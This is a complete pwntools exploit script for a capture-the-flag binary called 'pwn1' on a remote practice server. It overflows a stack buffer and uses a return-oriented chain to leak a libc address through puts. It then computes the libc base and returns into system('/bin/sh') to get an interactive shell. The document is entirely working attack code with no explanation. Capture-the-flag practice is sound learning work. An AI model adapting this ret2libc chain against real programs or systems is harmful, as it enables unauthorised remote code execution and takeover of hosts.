from pwn import *

#context.log_level = 'debug'
#p = process('./pwn1')
p = remote('node4.buuoj.cn', 26435)

#gdb.attach(p, 'b *0x40078e')

libc = ELF('libc-2.23.buu.so')
elf = ELF('pwn1')

libc_start_main = 0x600ff0
puts_plt = elf.plt['puts']
pop_rdi_ret = 0x400843

fun1 = elf.sym['fun1']

payload = b'a' * ( 0x110 - 4 ) + b'\x18' + p64(pop_rdi_ret) + p64(libc_start_main) + p64(puts_plt) + p64(fun1)

p.sendlineafter(b'Hack 4 fun!', payload)

libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['__libc_start_main']
success('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0x110 - 4 ) + b'\x18' + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
p.sendline(payload)

p.interactive()